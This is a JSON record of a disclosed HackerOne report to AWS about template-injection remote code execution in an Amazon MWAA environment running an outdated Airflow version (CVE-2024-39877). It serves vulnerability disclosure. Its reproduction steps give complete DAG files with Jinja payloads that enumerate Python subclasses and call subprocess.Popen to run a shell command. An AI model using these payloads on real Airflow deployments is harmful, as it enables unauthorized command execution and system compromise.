{
  "id": 3217840,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjE3ODQw",
  "url": "https://hackerone.com/reports/3217840",
  "title": "Remote Code Execution in Amazon MWAA due to outdated Apache Airflow version",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "none",
  "readable_substate": "Informative",
  "created_at": "2025-06-24T12:59:36.286Z",
  "submitted_at": "2025-06-24T12:59:36.528Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ricardojoserf",
    "url": "/ricardojoserf",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 84809,
    "url": "https://hackerone.com/aws_vdp",
    "handle": "aws_vdp",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/24kn32xntf4cdmtpkqlf6lp1o3q3/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/24kn32xntf4cdmtpkqlf6lp1o3q3/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "AWS VDP",
      "twitter_handle": "amazon",
      "website": "https://aws.amazon.com/",
      "about": "Amazon Web Services (AWS) is a secure cloud services platform, offering compute power and other functionality to help businesses scale and grow. "
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2024-39877"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2025-08-14T14:55:11.887Z",
  "bug_reporter_agreed_on_going_public_at": "2025-07-26T22:33:28.708Z",
  "team_member_agreed_on_going_public_at": "2025-08-14T14:55:11.550Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Explanation:**\n\nI am a penetration tester working with Siemens. During a collaborative security assessment with an internal team, I discovered a Remote Code Execution (RCE) vulnerability in an Amazon Managed Workflows for Apache Airflow (MWAA) environment. I initially reported this issue to the AWS security team via aws-security@amazon.com, and they directed me to submit the vulnerability through this HackerOne program. I also would like to know how far it is legally correct to execute code, I understand this is Amazon's infrastructure so I just did a quick PoC to prove the affected team how important it is to solve this issue.\n\n**Description:** \n\nThe team using Amazon MWAA is currently running Apache Airflow version 2.9.2, which is affected by CVE-██████████-39877, a Server-Side Template Injection (SSTI) vulnerability that enables Remote Code Execution (RCE). \n\n**Recommendations:**\n\nGiven the severity of this issue, I strongly recommend that :\n- Amazon discontinues offering any Airflow versions below 2.9.3 on the MWAA service.\n- Disable classes which might be used to execute code remotely on the context of the MWAA environment, such as *subprocess.Popen*.\n- Additionally, if any customers are still running vulnerable versions, they should be proactively notified, similar to how they receive alerts when suspicious activity is detected, such as repeated requests to /robots.txt that may indicate web scanner activity.\n\n## Steps To Reproduce:\n\n   1. First, upload to the S3 bucket a DAG file named \"test_1.py\" to check the vulnerability exists. If it does, there should be a \"9\" when clicking \"Grid\" in the newly created \"test_1\" DAG - if not, the version might not be vulnerable:\n\n```\nfrom datetime import datetime, timedelta\nfrom airflow import DAG\nfrom airflow.operators.python import PythonOperator\n\ndef say_hello():\n    print(\"¡Hola, mundo desde Airflow!\")\n\ndefault_args = {\n    'owner': 'airflow',\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1),\n}\n\nwith DAG(\n    dag_id='test_1',\n    default_args=default_args,\n    description='Test Uno',\n    schedule_interval='@daily',  # se ejecuta una vez al día\n    start_date=datetime(███████),\n    catchup=False,\n    tags=['ejemplo'],\n    doc_md=\"\"\"\n    # Test 1\n    {{3*3}}\n    \"\"\"\n) as dag:\n    tarea_1 = PythonOperator(\n        task_id='di_hola',\n        python_callable=say_hello,\n    )\n```\n\n   2. Second, upload to the S3 bucket a DAG file \"test_2.py\" to list the available classes, with code like this:\n\n```\nfrom datetime import datetime, timedelta\nfrom airflow import DAG\nfrom airflow.operators.python import PythonOperator\n\ndef say_hello():\n    print(\"¡Hola, mundo desde Airflow!\")\n\ndefault_args = {\n    'owner': 'airflow',\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1),\n}\n\nwith DAG(\n    dag_id='test_2',\n    default_args=default_args,\n    description='Un DAG de ejemplo muy simple',\n    schedule_interval='@daily',  # se ejecuta una vez al día\n    start_date=datetime(██████),\n    catchup=False,\n    tags=['ejemplo'],\n    doc_md=\"\"\"\n    # Test 2\n    {{ ''.__class__.__mro__[1].__subclasses__() }}\n    \"\"\"\n) as dag:\n    tarea_1 = PythonOperator(\n        task_id='di_hola',\n        python_callable=say_hello,\n    )\n```\n\n  3. Copy the list of available classes and find the index for the *subProcess.Popen* class. A easy way to do this is is to copy all the classes until Popen class, and count the number of commas before it. In my case the index number is 309, but it will be different when you test this.\n\n  4.  Once you have the correct index, check the class name is correct, you should see \"Popen\" if you got the correct index. Upload \"test_3.py\". **NOTE**: Update the correct index, it will not be 309:\n\n```\nfrom datetime import datetime, timedelta\nfrom airflow import DAG\nfrom airflow.operators.python import PythonOperator\n\ndef say_hello():\n    print(\"¡Hola, mundo desde Airflow!\")\n\ndefault_args = {\n    'owner': 'airflow',\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1),\n}\n\nwith DAG(\n    dag_id='test_3',\n    default_args=default_args,\n    description='Un DAG de ejemplo muy simple',\n    schedule_interval='@daily',  # se ejecuta una vez al día\n    start_date=datetime(██████),\n    catchup=False,\n    tags=['ejemplo'],\n    doc_md=\"\"\"\n    # Test 3\n    ### Class Name\n    {{ ''.__class__.__mro__[1].__subclasses__()[309].__name__ }}\n) as dag:\n    tarea_1 = PythonOperator(\n        task_id='di_hola',\n        python_callable=say_hello,\n    )\n```\n\n  5. Now with the correct index, run a command on the context of the MWAA environment with \"test_4.py\". **NOTE**: Update the correct index, it will not be 309:\n\n ```\nfrom datetime import datetime, timedelta\nfrom airflow import DAG\nfrom airflow.operators.python import PythonOperator\ndef say_hello():\n    print(\"¡Hola, mundo desde Airflow!\")\ndefault_args = {\n    'owner': 'airflow',\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1),\n}\nwith DAG(\n    dag_id='test_4',\n    default_args=default_args,\n    description='Un DAG de ejemplo muy simple',\n    schedule_interval='@daily',  # se ejecuta una vez al día\n    start_date=datetime(█████),\n    catchup=False,\n    tags=['ejemplo'],\n    doc_md=\"\"\"\n    # Test 4\n    ### Commands Output\n    {{ ''.__class__.__mro__[1].__subclasses__()[309]('id', shell=True, stdout=-1).communicate() }}\n) as dag:\n    tarea_1 = PythonOperator(\n        task_id='di_hola',\n        python_callable=say_hello,\n    )\n```\n\n## Impact\n\n## Summary: An attacker can execute arbitrary commands remotely on the affected environment. While I limited my actions to a non-destructive proof-of-concept command, a malicious actor could leverage this vulnerability to access sensitive data, manipulate the system, or pivot to attack other resources within the same VPC. The risk includes potential full system compromise and lateral movement within the cloud infrastructure.",
  "weakness": {
    "id": 1134,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 1,
  "voters": [
    "2026"
  ],
  "severity": {
    "rating": "none",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 742148,
    "asset_type": "OTHER",
    "asset_identifier": "Amazon Managed Workflows for Apache Airflow (Amazon MWAA)",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
